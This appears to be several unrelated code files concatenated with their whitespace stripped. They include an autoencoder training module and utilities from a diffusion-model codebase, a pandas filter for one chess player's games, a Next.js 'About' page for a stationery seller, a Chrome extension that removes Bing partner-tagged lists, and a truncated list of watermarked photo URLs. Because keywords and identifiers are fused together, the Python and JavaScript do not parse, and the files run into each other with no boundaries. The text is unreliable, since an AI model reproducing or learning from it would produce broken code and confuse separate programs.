get_nested_attribute,get_obj_from_str,instantiate_from_config)logpy=logging.getLogger(__name__)classAbstractAutoencoder(pl.LightningModule):"""Thisisthebaseclassforallautoencoders,includingimageautoencoders,imageautoencoderswithdiscriminators,unCLIPmodels,etc.Hence,itisfairlygeneral,andspecificfeatures(e.g.discriminatortraining,encoding,decoding)mustbeimplementedinsubclasses."""def__init__(self,ema_decay:Union[None,float]=None,monitor:Union[None,str]=None,input_key:str="jpg",):super().__init__()self.input_key=input_keyself.use_ema=ema_decayisnotNoneifmonitorisnotNone:self.monitor=monitorifself.use_ema:self.model_ema=LitEma(self,decay=ema_decay)logpy.info(f"KeepingEMAsof{len(list(self.model_ema.buffers()))}.")ifversion.parse(torch.__version__)>=version.parse("2.0.0"):self.automatic_optimization=Falsedefapply_ckpt(self,ckpt:Union[None,str,dict]):ifckptisNone:returnifisinstance(ckpt,str):ckpt={"target":"sgm.modules.checkpoint.CheckpointEngine","params":{"ckpt_path":ckpt},}engine=instantiate_from_config(ckpt)engine(self)@abstractmethoddefget_input(self,batch)->Any:raiseNotImplementedError()defon_train_batch_end(self,*args,**kwargs):#forEMAcomputationifself.use_ema:self.model_ema(self)@contextmanagerdefema_scope(self,context=None):ifself.use_ema:self.model_ema.store(self.parameters())self.model_ema.copy_to(self)ifcontextisnotNone:logpy.info(f"{context}:SwitchedtoEMAweights")try:yieldNonefinally:ifself.use_ema:self.model_ema.restore(self.parameters())ifcontextisnotNone:logpy.info(f"{context}:Restoredtrainingweights")@abstractmethoddefencode(self,*args,**kwargs)->torch.Tensor:raiseNotImplementedError("encode()-methodofabstractbaseclasscalled")@abstractmethoddefdecode(self,*args,**kwargs)->torch.Tensor:raiseNotImplementedError("decode()-methodofabstractbaseclasscalled")definstantiate_optimizer_from_config(self,params,lr,cfg):logpy.info(f"loading>>>{cfg['target']}<<<optimizerfromconfig")returnget_obj_from_str(cfg["target"])(params,lr=lr,**cfg.get("params",dict()))defconfigure_optimizers(self)->Any:raiseNotImplementedError()classAutoencodingEngine(AbstractAutoencoder):"""Baseclassforallimageautoencodersthatwetrain,likeVQGANorAutoencoderKL(wealsorestorethemexplicitlyasspecialcasesforlegacyreasons).RegularizationssuchasKLorVQaremovedtotheregularizerclass."""def__init__(self,*args,encoder_config:Dict,decoder_config:Dict,loss_config:Dict,regularizer_config:Dict,optimizer_config:Union[Dict,None]=None,lr_g_factor:float=1.0,trainable_ae_params:Optional[List[List[str]]]=None,ae_optimizer_args:Optional[List[dict]]=None,trainable_disc_params:Optional[List[List[str]]]=None,disc_optimizer_args:Optional[List[dict]]=None,disc_start_iter:int=0,diff_boost_factor:float=3.0,ckpt_engine:Union[None,str,dict]=None,ckpt_path:Optional[str]=None,additional_decode_keys:Optional[List[str]]=None,**kwargs,):super().__init__(*args,**kwargs)self.automatic_optimization=False#pytorchlightningself.encoder:torch.nn.Module=instantiate_from_config(encoder_config)self.decoder:torch.nn.Module=instantiate_from_config(decoder_config)self.loss:torch.nn.Module=instantiate_from_config(loss_config)self.regularization:AbstractRegularizer=instantiate_from_config(regularizer_config)self.optimizer_config=default(optimizer_config,{"target":"torch.optim.Adam"})self.diff_boost_factor=diff_boost_factorself.disc_start_iter=disc_start_iterself.lr_g_factor=lr_g_factorself.trainable_ae_params=trainable_ae_paramsifself.trainable_ae_paramsisnotNone:self.ae_optimizer_args=default(ae_optimizer_args,[{}for_inrange(len(self.trainable_ae_params))],)assertlen(self.ae_optimizer_args)==len(self.trainable_ae_params)else:self.ae_optimizer_args=[{}]#makestypeconsitentself.trainable_disc_params=trainable_disc_paramsifself.trainable_disc_paramsisnotNone:self.disc_optimizer_args=default(disc_optimizer_args,[{}for_inrange(len(self.trainable_disc_params))],)assertlen(self.disc_optimizer_args)==len(self.trainable_disc_params)else:self.disc_optimizer_args=[{}]#makestypeconsitentifckpt_pathisnotNone:assertckpt_engineisNone,"Can'tsetckpt_engineandckpt_path"logpy.warn("Checkpointpathisdeprecated,use`checkpoint_egnine`instead")self.apply_ckpt(default(ckpt_path,ckpt_engine))self.additional_decode_keys=set(default(additional_decode_keys,[]))defget_input(self,batch:Dict)->torch.Tensor:#assumingunifieddataformat,dataloaderreturnsadict.#imagetensorsshouldbescaledto-1...1andinchannels-first#format(e.g.,bchwinsteadifbhwc)returnbatch[self.input_key]defget_autoencoder_params(self)->list:params=[]ifhasattr(self.loss,"get_trainable_autoencoder_parameters"):params+=list(self.loss.get_trainable_autoencoder_parameters())ifhasattr(self.regularization,"get_trainable_parameters"):params+=list(self.regularization.get_trainable_parameters())params=params+list(self.encoder.parameters())params=params+list(self.decoder.parameters())returnparamsdefget_discriminator_params(self)->list:ifhasattr(self.loss,"get_trainable_parameters"):params=list(self.loss.get_trainable_parameters())#e.g.,discriminatorelse:params=[]returnparamsdefget_last_layer(self):returnself.decoder.get_last_layer()defencode(self,x:torch.Tensor,return_reg_log:bool=False,unregularized:bool=False,)->Union[torch.Tensor,Tuple[torch.Tensor,dict]]:z=self.encoder(x)ifunregularized:returnz,dict()z,reg_log=self.regularization(z)ifreturn_reg_log:returnz,reg_logreturnzdefdecode(self,z:torch.Tensor,**kwargs)->torch.Tensor:x=self.decoder(z,**kwargs)returnxdefforward(self,x:torch.Tensor,**additional_decode_kwargs)->Tuple[torch.Tensor,torch.Tensor,dict]:z,reg_log=self.encode(x,return_reg_log=True)dec=self.decode(z,**additional_decode_kwargs)returnz,dec,reg_logdefinner_training_step(self,batch:dict,batch_idx:int,optimizer_idx:int=0)->torch.Tensor:x=self.get_input(batch)additional_decode_kwargs={key:batch[key]forkeyinself.additional_decode_keys.intersection(batch)}z,xrec,regularization_log=self(x,**additional_decode_kwargs)ifhasattr(self.loss,"forward_keys"):extra_info={"z":z,"optimizer_idx":optimizer_idx,"global_step":self.global_step,"last_layer":self.get_last_layer(),"split":"train","regularization_log":regularization_log,"autoencoder":self,}extra_info={k:extra_info[k]forkinself.loss.forward_keys}else:extra_info=dict()ifoptimizer_idx==0:#autoencodeout_loss=self.loss(x,xrec,**extra_info)ifisinstance(out_loss,tuple):aeloss,log_dict_ae=out_losselse:#simplelossfunctionaeloss=out_losslog_dict_ae={"train/loss/rec":aeloss.detach()}self.log_dict(log_dict_ae,prog_bar=False,logger=True,on_step=True,on_epoch=True,sync_dist=False,)self.log("loss",aeloss.mean().detach(),prog_bar=True,logger=False,on_epoch=False,on_step=True,)returnaelosselifoptimizer_idx==1:#discriminatordiscloss,log_dict_disc=self.loss(x,xrec,**extra_info)#->discriminatoralwaysneedstoreturnatupleself.log_dict(log_dict_disc,prog_bar=False,logger=True,on_step=True,on_epoch=True)returndisclosselse:raiseNotImplementedError(f"Unknownoptimizer{optimizer_idx}")deftraining_step(self,batch:dict,batch_idx:int):opts=self.optimizers()ifnotisinstance(opts,list):#Non-adversarialcaseopts=[opts]optimizer_idx=batch_idx%len(opts)ifself.global_step<self.disc_start_iter:optimizer_idx=0opt=opts[optimizer_idx]opt.zero_grad()withopt.toggle_model():loss=self.inner_training_step(batch,batch_idx,optimizer_idx=optimizer_idx)self.manual_backward(loss)opt.step()defvalidation_step(self,batch:dict,batch_idx:int)->Dict:log_dict=self._validation_step(batch,batch_idx)withself.ema_scope():log_dict_ema=self._validation_step(batch,batch_idx,postfix="_ema")log_dict.update(log_dict_ema)returnlog_dictdef_validation_step(self,batch:dict,batch_idx:int,postfix:str="")->Dict:x=self.get_input(batch)z,xrec,regularization_log=self(x)ifhasattr(self.loss,"forward_keys"):extra_info={"z":z,"optimizer_idx":0,"global_step":self.global_step,"last_layer":self.get_last_layer(),"split":"val"+postfix,"regularization_log":regularization_log,"autoencoder":self,}extra_info={k:extra_info[k]forkinself.loss.forward_keys}else:extra_info=dict()out_loss=self.loss(x,xrec,**extra_info)ifisinstance(out_loss,tuple):aeloss,log_dict_ae=out_losselse:#simplelossfunctionaeloss=out_losslog_dict_ae={f"val{postfix}/loss/rec":aeloss.detach()}full_log_dict=log_dict_aeif"optimizer_idx"inextra_info:extra_info["optimizer_idx"]=1discloss,log_dict_disc=self.loss(x,xrec,**extra_info)full_log_dict.update(log_dict_disc)self.log(f"val{postfix}/loss/rec",log_dict_ae[f"val{postfix}/loss/rec"],sync_dist=True,)self.log_dict(full_log_dict,sync_dist=True)returnfull_log_dictdefget_param_groups(self,parameter_names:List[List[str]],optimizer_args:List[dict])->Tuple[List[Dict[str,Any]],int]:groups=[]num_params=0fornames,argsinzip(parameter_names,optimizer_args):params=[]forpattern_innames:pattern_params=[]pattern=re.compile(pattern_)forp_name,paraminself.named_parameters():ifre.match(pattern,p_name):pattern_params.append(param)num_params+=param.numel()iflen(pattern_params)==0:logpy.warn(f"Didnotfindparametersforpattern{pattern_}")params.extend(pattern_params)groups.append({"params":params,**args})returngroups,num_paramsdefconfigure_optimizers(self)->List[torch.optim.Optimizer]:ifself.trainable_ae_paramsisNone:ae_params=self.get_autoencoder_params()else:ae_params,num_ae_params=self.get_param_groups(self.trainable_ae_params,self.ae_optimizer_args)logpy.info(f"Numberoftrainableautoencoderparameters:{num_ae_params:,}")ifself.trainable_disc_paramsisNone:disc_params=self.get_discriminator_params()else:disc_params,num_disc_params=self.get_param_groups(self.trainable_disc_params,self.disc_optimizer_args)logpy.info(f"Numberoftrainablediscriminatorparameters:{num_disc_params:,}")opt_ae=self.instantiate_optimizer_from_config(ae_params,default(self.lr_g_factor,1.0)*self.learning_rate,self.optimizer_config,)opts=[opt_ae]iflen(disc_params)>0:opt_disc=self.instantiate_optimizer_from_config(disc_params,self.learning_rate,self.optimizer_config)opts.append(opt_disc)returnopts@torch.no_grad()deflog_images(self,batch:dict,additional_log_kwargs:Optional[Dict]=None,**kwargs)->dict:log=dict()additional_decode_kwargs={}x=self.get_input(batch)additional_decode_kwargs.update({key:batch[key]forkeyinself.additional_decode_keys.intersection(batch)})_,xrec,_=self(x,**additional_decode_kwargs)log["inputs"]=xlog["reconstructions"]=xrecdiff=0.5*torch.abs(torch.clamp(xrec,-1.0,1.0)-x)diff.clamp_(0,1.0)log["diff"]=2.0*diff-1.0#diff_boostshowslocationofsmallerrors,byboostingtheir#brightness.log["diff_boost"]=(2.0*torch.clamp(self.diff_boost_factor*diff,0.0,1.0)-1)ifhasattr(self.loss,"log_images"):log.update(self.loss.log_images(x,xrec))withself.ema_scope():_,xrec_ema,_=self(x,**additional_decode_kwargs)log["reconstructions_ema"]=xrec_emadiff_ema=0.5*torch.abs(torch.clamp(xrec_ema,-1.0,1.0)-x)diff_ema.clamp_(0,1.0)log["diff_ema"]=2.0*diff_ema-1.0log["diff_boost_ema"]=(2.0*torch.clamp(self.diff_boost_factor*diff_ema,0.0,1.0)-1)ifadditional_log_kwargs:additional_decode_kwargs.update(additional_log_kwargs)_,xrec_add,_=self(x,**additional_decode_kwargs)log_str="reconstructions-"+"-".join([f"{key}={additional_log_kwargs[key]}"forkeyinadditional_log_kwargs])log[log_str]=xrec_addreturnlogclassAutoencodingEngineLegacy(AutoencodingEngine):def__init__(self,embed_dim:int,**kwargs):self.max_batch_size=kwargs.pop("max_batch_size",None)ddconfig=kwargs.pop("ddconfig")ckpt_path=kwargs.pop("ckpt_path",None)ckpt_engine=kwargs.pop("ckpt_engine",None)super().__init__(encoder_config={"target":"sgm.modules.diffusionmodules.model.Encoder","params":ddconfig,},decoder_config={"target":"sgm.modules.diffusionmodules.model.Decoder","params":ddconfig,},**kwargs,)self.quant_conv=torch.nn.Conv2d((1+ddconfig["double_z"])*ddconfig["z_channels"],(1+ddconfig["double_z"])*embed_dim,1,)self.post_quant_conv=torch.nn.Conv2d(embed_dim,ddconfig["z_channels"],1)self.embed_dim=embed_dimself.apply_ckpt(default(ckpt_path,ckpt_engine))defget_autoencoder_params(self)->list:params=super().get_autoencoder_params()returnparamsdefencode(self,x:torch.Tensor,return_reg_log:bool=False)->Union[torch.Tensor,Tuple[torch.Tensor,dict]]:ifself.max_batch_sizeisNone:z=self.encoder(x)z=self.quant_conv(z)else:N=x.shape[0]bs=self.max_batch_sizen_batches=int(math.ceil(N/bs))z=list()fori_batchinrange(n_batches):z_batch=self.encoder(x[i_batch*bs:(i_batch+1)*bs])z_batch=self.quant_conv(z_batch)z.append(z_batch)z=torch.cat(z,0)z,reg_log=self.regularization(z)ifreturn_reg_log:returnz,reg_logreturnzdefdecode(self,z:torch.Tensor,**decoder_kwargs)->torch.Tensor:ifself.max_batch_sizeisNone:dec=self.post_quant_conv(z)dec=self.decoder(dec,**decoder_kwargs)else:N=z.shape[0]bs=self.max_batch_sizen_batches=int(math.ceil(N/bs))dec=list()fori_batchinrange(n_batches):dec_batch=self.post_quant_conv(z[i_batch*bs:(i_batch+1)*bs])dec_batch=self.decoder(dec_batch,**decoder_kwargs)dec.append(dec_batch)dec=torch.cat(dec,0)returndecclassAutoencoderKL(AutoencodingEngineLegacy):def__init__(self,**kwargs):if"lossconfig"inkwargs:kwargs["loss_config"]=kwargs.pop("lossconfig")super().__init__(regularizer_config={"target":("sgm.modules.autoencoding.regularizers"".DiagonalGaussianRegularizer")},**kwargs,)classAutoencoderLegacyVQ(AutoencodingEngineLegacy):def__init__(self,embed_dim:int,n_embed:int,sane_index_shape:bool=False,**kwargs,):if"lossconfig"inkwargs:logpy.warn(f"Parameter`lossconfig`isdeprecated,use`loss_config`.")kwargs["loss_config"]=kwargs.pop("lossconfig")super().__init__(regularizer_config={"target":("sgm.modules.autoencoding.regularizers.quantize"".VectorQuantizer"),"params":{"n_e":n_embed,"e_dim":embed_dim,"sane_index_shape":sane_index_shape,},},**kwargs,)classIdentityFirstStage(AbstractAutoencoder):def__init__(self,*args,**kwargs):super().__init__(*args,**kwargs)defget_input(self,x:Any)->Any:returnxdefencode(self,x:Any,*args,**kwargs)->Any:returnxdefdecode(self,x:Any,*args,**kwargs)->Any:returnxclassAEIntegerWrapper(nn.Module):def__init__(self,model:nn.Module,shape:Union[None,Tuple[int,int],List[int]]=(16,16),regularization_key:str="regularization",encoder_kwargs:Optional[Dict[str,Any]]=None,):super().__init__()self.model=modelasserthasattr(model,"encode")andhasattr(model,"decode"),"NeedAEinterface"self.regularization=get_nested_attribute(model,regularization_key)self.shape=shapeself.encoder_kwargs=default(encoder_kwargs,{"return_reg_log":True})defencode(self,x)->torch.Tensor:assert(notself.training),f"{self.__class__.__name__}onlysupportsinferencecurrently"_,log=self.model.encode(x,**self.encoder_kwargs)assertisinstance(log,dict)inds=log["min_encoding_indices"]returnrearrange(inds,"b...->b(...)")defdecode(self,inds:torch.Tensor,shape:Union[None,tuple,list]=None)->torch.Tensor:#expectindsshape(b,s)withs=h*wshape=default(shape,self.shape)#Optional[(h,w)]ifshapeisnotNone:assertlen(shape)==2,f"Unhandeledshape{shape}"inds=rearrange(inds,"b(hw)->bhw",h=shape[0],w=shape[1])h=self.regularization.get_codebook_entry(inds)#(b,h,w,c)h=rearrange(h,"bhwc->bchw")returnself.model.decode(h)classAutoencoderKLModeOnly(AutoencodingEngineLegacy):def__init__(self,**kwargs):if"lossconfig"inkwargs:kwargs["loss_config"]=kwargs.pop("lossconfig")super().__init__(regularizer_config={"target":("sgm.modules.autoencoding.regularizers"".DiagonalGaussianRegularizer"),"params":{"sample":False},},**kwargs,)importpandasaspddf=pd.read_feather('games.feather')#filterdftoincludegameswhereoneoftheplayersisHoldUp7636df=df[(df['White']=='HoldUp7636')|(df['Black']=='HoldUp7636')]print(df)importImagefrom'next/image';importNavbarfrom'@/components/Navbar';importHeadfrom'next/head';importFooterfrom'@/components/Footer';constAbout=()=>{return(<div><Head><title>AboutUs</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><divclassName='flexflex-colitems-centerjustify-centermin-h-[10em]p-10mt-10mb-12'><divclassName='max-w-xl'><h1className='text-4xltext-blackfont-semiboldm-2'>Weprovidethesuppliesthatenablerapidlearningintheclassroom.</h1><pclassName='text-smtext-gray-500m-2'>EnduraScribesupportsclassroommodernizationeffortsthroughitslong-lasting,liquid-inkstationery.</p></div><hrclassName='w-48h-1mx-autoborder-0roundedmt-5bg-gray-500'/></div><divclassName='xl:w-2/3lg:w-3/4md:w-fullsm:w-fullmx-autoflexpy-2px-10bg-gray-100rounded-xl'><divclassName='lg:w-1/2md:w-fullm-5'><h1className='font-semiboldtext-2xlp-2'>EnduraScribehelpsschoolstransformtheirclassrooms</h1><pclassName='p-2'>Webelievethattherighttoolscanmakeallthedifferenceinaneducationalsetting.Weunderstandthatinthedynamicandever-evolvinglandscapeofeducation,thetoolsusedcanprofoundlyimpactthelearningprocess.It&apos;snotjustabouthavingsupplies;it&apos;sabouthavingtherightsuppliesthatcankeepupwiththepaceofbright,inquisitiveminds.</p><pclassName='p-2'>That&apos;swhywe&apos;vededicatedourselvestoprovidinghigh-qualitypens,highlighters,anddryerasemarkerstoschoolsacrossthecountry.Ourpensaredesignedforsmooth,effortlesswriting,ourhighlighterscomeinavarietyofvibrantcolorsforeffectivenote-taking,andourdryerasemarkersareperfectforinteractivewhiteboardsessions.</p></div><divclassName='mx-5w-1/2p-5hiddensm:hiddenmd:hiddenlg:block'><ImageclassName='h-80object-coverrounded-lg'src={'/classroom.jpg'}width={1000}height={0}alt='classroom'priority/></div></div><divclassName='xl:w-2/3lg:w-3/4md:w-fullsm:w-fullmx-autoflexpy-5px-10mb-0pb-0'><divclassName='text-lg'><h2className='font-boldtext-2xlmb-4'>WhatWeDo</h2><pclassName='mb-4'>Wespecializeintheproductionanddistributionoftop-tierwritinginstruments.Ourproductrangeincludes:</p><ulclassName='list-discml-5'><liclassName='mb-2'><spanclassName='font-bold'>Pens:</span>Ourpensaredesignedforsmoothwriting,helpingstudentstotakeefficientnotesinclass.</li><liclassName='mb-2'><spanclassName='font-bold'>Highlighters:</span>Ourhighlighterscomeinavarietyofvibrantcolors,perfectforemphasizingimportantpointsintextbooksandnotes.</li><liclassName='mb-2'><spanclassName='font-bold'>DryEraseMarkers:</span>Ourdryerasemarkersareperfectforclassroomwhiteboards,aidingteachersinpresentinglessonsinaclearandengagingmanner.</li></ul></div></div><divclassName='xl:w-2/3lg:w-3/4md:w-fullsm:w-fullmx-autoflexpy-5px-10'><divclassName='text-lg'><h2className='font-boldtext-2xlmb-4'>WhyChooseUs</h2><pclassName='mb-4'>We&apos;remorethanjustastationerysupplier.We&apos;reacompanythatcaresaboutthefutureofeducation.Bychoosingus,you&apos;renotonlygettingsuperiorproducts,you&apos;realsocontributingtoalargermission:toenhancestudentengagementandparticipationinclassrooms.</p><pclassName='mb-4'>Webelievethateducationisthecornerstoneofourfuture,andwearecommittedtomakingthatfuturebrightbyenhancingthequalityofeducation.Bychoosingus,youarenotonlyensuringthatyoureceivetop-notchproducts,butyouarealsocontributingtoacausethathasthepotentialtoshapethefutureofeducation.</p><pclassName='mb-4'>Joinusinourmissiontorevolutionizeclassroomswithbettersupplies.Together,wecanmakeadifference.</p></div></div><Footer/></div>);};exportdefaultAbout;importfunctoolsimportimportlibimportosfromfunctoolsimportpartialfrominspectimportisfunctionimportfsspecimportnumpyasnpimporttorchfromPILimportImage,ImageDraw,ImageFontfromsafetensors.torchimportload_fileasload_safetensorsdefdisabled_train(self,mode=True):"""Overwritemodel.trainwiththisfunctiontomakesuretrain/evalmodedoesnotchangeanymore."""returnselfdefget_string_from_tuple(s):try:#Checkifthestringstartsandendswithparenthesesifs[0]=="("ands[-1]==")":#Convertthestringtoatuplet=eval(s)#Checkifthetypeoftistupleiftype(t)==tuple:returnt[0]else:passexcept:passreturnsdefis_power_of_two(n):"""chat.openai.com/chatReturnTrueifnisapowerof2,otherwisereturnFalse.Thefunctionis_power_of_twotakesanintegernasinputandreturnsTrueifnisapowerof2,otherwiseitreturnsFalse.Thefunctionworksbyfirstcheckingifnislessthanorequalto0.Ifnislessthanorequalto0,itcan'tbeapowerof2,sothefunctionreturnsFalse.Ifnisgreaterthan0,thefunctioncheckswhethernisapowerof2byusingabitwiseANDoperationbetweennandn-1.Ifnisapowerof2,thenitwillhaveonlyonebitsetto1initsbinaryrepresentation.Whenwesubtract1fromapowerof2,allthebitstotherightofthatbitbecome1,andthebititselfbecomes0.So,whenweperformabitwiseANDbetweennandn-1,weget0ifnisapowerof2,andanon-zerovalueotherwise.Thus,iftheresultofthebitwiseANDoperationis0,thennisapowerof2andthefunctionreturnsTrue.Otherwise,thefunctionreturnsFalse."""ifn<=0:returnFalsereturn(n&(n-1))==0defautocast(f,enabled=True):defdo_autocast(*args,**kwargs):withtorch.cuda.amp.autocast(enabled=enabled,dtype=torch.get_autocast_gpu_dtype(),cache_enabled=torch.is_autocast_cache_enabled(),):returnf(*args,**kwargs)returndo_autocastdefload_partial_from_config(config):returnpartial(get_obj_from_str(config["target"]),**config.get("params",dict()))deflog_txt_as_img(wh,xc,size=10):#whatupleof(width,height)#xcalistofcaptionstoplotb=len(xc)txts=list()forbiinrange(b):txt=Image.new("RGB",wh,color="white")draw=ImageDraw.Draw(txt)font=ImageFont.truetype("data/DejaVuSans.ttf",size=size)nc=int(40*(wh[0]/256))ifisinstance(xc[bi],list):text_seq=xc[bi][0]else:text_seq=xc[bi]lines="\n".join(text_seq[start:start+nc]forstartinrange(0,len(text_seq),nc))try:draw.text((0,0),lines,fill="black",font=font)exceptUnicodeEncodeError:print("Cantencodestringforlogging.Skipping.")txt=np.array(txt).transpose(2,0,1)/127.5-1.0txts.append(txt)txts=np.stack(txts)txts=torch.tensor(txts)returntxtsdefpartialclass(cls,*args,**kwargs):classNewCls(cls):__init__=functools.partialmethod(cls.__init__,*args,**kwargs)returnNewClsdefmake_path_absolute(path):fs,p=fsspec.core.url_to_fs(path)iffs.protocol=="file":returnos.path.abspath(p)returnpathdefismap(x):ifnotisinstance(x,torch.Tensor):returnFalsereturn(len(x.shape)==4)and(x.shape[1]>3)defisimage(x):ifnotisinstance(x,torch.Tensor):returnFalsereturn(len(x.shape)==4)and(x.shape[1]==3orx.shape[1]==1)defisheatmap(x):ifnotisinstance(x,torch.Tensor):returnFalsereturnx.ndim==2defisneighbors(x):ifnotisinstance(x,torch.Tensor):returnFalsereturnx.ndim==5and(x.shape[2]==3orx.shape[2]==1)defexists(x):returnxisnotNonedefexpand_dims_like(x,y):whilex.dim()!=y.dim():x=x.unsqueeze(-1)returnxdefdefault(val,d):ifexists(val):returnvalreturnd()ifisfunction(d)elseddefmean_flat(tensor):"""https://github.com/openai/guided-diffusion/blob/27c20a8fab9cb472df5d6bdd6c8d11c8f430b924/guided_diffusion/nn.py#L86Takethemeanoverallnon-batchdimensions."""returntensor.mean(dim=list(range(1,len(tensor.shape))))defcount_params(model,verbose=False):total_params=sum(p.numel()forpinmodel.parameters())ifverbose:print(f"{model.__class__.__name__}has{total_params*1.e-6:.2f}Mparams.")returntotal_paramsdefinstantiate_from_config(config):ifnot"target"inconfig:ifconfig=="__is_first_stage__":returnNoneelifconfig=="__is_unconditional__":returnNoneraiseKeyError("Expectedkey`target`toinstantiate.")returnget_obj_from_str(config["target"])(**config.get("params",dict()))defget_obj_from_str(string,reload=False,invalidate_cache=True):module,cls=string.rsplit(".",1)ifinvalidate_cache:importlib.invalidate_caches()ifreload:module_imp=importlib.import_module(module)importlib.reload(module_imp)returngetattr(importlib.import_module(module,package=None),cls)defappend_zero(x):returntorch.cat([x,x.new_zeros([1])])defappend_dims(x,target_dims):"""Appendsdimensionstotheendofatensoruntilithastarget_dimsdimensions."""dims_to_append=target_dims-x.ndimifdims_to_append<0:raiseValueError(f"inputhas{x.ndim}dimsbuttarget_dimsis{target_dims},whichisless")returnx[(...,)+(None,)*dims_to_append]defload_model_from_config(config,ckpt,verbose=True,freeze=True):print(f"Loadingmodelfrom{ckpt}")ifckpt.endswith("ckpt"):pl_sd=torch.load(ckpt,map_location="cpu")if"global_step"inpl_sd:print(f"GlobalStep:{pl_sd['global_step']}")sd=pl_sd["state_dict"]elifckpt.endswith("safetensors"):sd=load_safetensors(ckpt)else:raiseNotImplementedErrormodel=instantiate_from_config(config.model)m,u=model.load_state_dict(sd,strict=False)iflen(m)>0andverbose:print("missingkeys:")print(m)iflen(u)>0andverbose:print("unexpectedkeys:")print(u)iffreeze:forparaminmodel.parameters():param.requires_grad=Falsemodel.eval()returnmodeldefget_configs_path()->str:"""Getthe`configs`directory.Foraworkingcopy,thisistheoneintherootoftherepository,butforaninstalledcopy,it'sinthe`sgm`package(seepyproject.toml)."""this_dir=os.path.dirname(__file__)candidates=(os.path.join(this_dir,"configs"),os.path.join(this_dir,"..","configs"),)forcandidateincandidates:candidate=os.path.abspath(candidate)ifos.path.isdir(candidate):returncandidateraiseFileNotFoundError(f"CouldnotfindSGMconfigsin{candidates}")defget_nested_attribute(obj,attribute_path,depth=None,return_key=False):"""Willreturntheresultofarecursivegetattributecall.E.g.:a.b.c=getattr(getattr(a,"b"),"c")=get_nested_attribute(a,"b.c")Ifanypartoftheattributecallisanintegerxwithcurrentobja,willtrytocalla[x]insteadofa.xfirst."""attributes=attribute_path.split(".")ifdepthisnotNoneanddepth>0:attributes=attributes[:depth]assertlen(attributes)>0,"Atleastoneattributeshouldbeselected"current_attribute=objcurrent_key=Noneforlevel,attributeinenumerate(attributes):current_key=".".join(attributes[:level+1])try:id_=int(attribute)current_attribute=current_attribute[id_]exceptValueError:current_attribute=getattr(current_attribute,attribute)return(current_attribute,current_key)ifreturn_keyelsecurrent_attributechrome.tabs.onUpdated.addListener((tabId,changeInfo,tab)=>{if(changeInfo.url){if(tab.url.includes('www.bing.com')){chrome.scripting.executeScript({target:{tabId:tab.id},function:setUpMutationObserver,});}}});functionsetUpMutationObserver(){constobserver=newMutationObserver(removeULsWithDataPartnerTag);observer.observe(document,{childList:true,subtree:true});}functionremoveULsWithDataPartnerTag(){constelements=document.querySelectorAll('ul[data-partnertag]');for(constelementofelements){element.remove();}}constfs=require('fs');consthttps=require('https');const{exit}=require('process');links=['https://photos.photoday.io/photos/images/c2f/89b/ab-/original/Z62_9088_cropped.png?1710610303&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/bba/17a/2d-/original/Z62_9088.png?1710610305&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/744/5ad/3c-/original/Z62_9086_cropped.png?1710610301&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/789/622/77-/original/Z62_9086.png?1710610303&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/643/ff8/ab-/original/Z62_9084_cropped.png?1710610300&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/a75/6ba/ea-/original/Z62_9084.png?1710610301&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/ed7/b11/37-/original/Z62_9082_cropped.png?1710610298&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/f03/790/ee-/original/Z62_9082.png?1710610300&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/df4/5b1/88-/original/Z62_9079_cropped.png?1710610296&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/891/958/65-/original/Z62_9079.png?1710610298&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/7a6/20e/1b-/original/Z62_9077_cropped.png?1710610294&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/1aa/19d/eb-/original/Z62_9077.png?1710610296&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/5d4/618/85-/original/Z62_9074_cropped.png?1710610292&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/165/a4e/90-/original/Z62_9074.png?1710610294&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/ae7/701/77-/original/Z62_9073_cropped.png?1710610290&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/3f3/7f5/a3-/original/Z62_9073.png?1710610292&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20Watermark.png?1707576141&mark_alpha=80&mark_scale=70&mark_upscale=true&w=600','https://photos.photoday.io/photos/images/49a/1c4/5e-/original/Z62_9071_cropped.png?1710610288&mark=/studios/watermarks/5df/1cd/3a-/original/PhotoDay%20W